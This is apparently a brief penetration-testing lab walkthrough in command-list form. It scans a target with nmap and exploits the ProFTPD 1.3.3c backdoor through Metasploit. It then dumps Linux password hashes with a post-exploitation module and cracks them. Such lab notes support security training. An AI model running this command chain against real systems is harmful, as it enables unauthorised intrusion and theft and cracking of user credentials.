- Command: nmap -sS -sV 192.229.31.3
- nmap --script vuln -p 21 192.229.31.3
-  /etc/init.d/postgresql start
- exploit proftpd server using exploit/unix/ftp/proftpd_133c_backdoor

***We have exploited the target ftp server. We will use a post exploitation module to dump the system users hashes***

- use post/linux/gather/hashdump - set SESSION 1 - exploit
- use auxiliary/analyze/crack_linux
- set SHA512 true - run
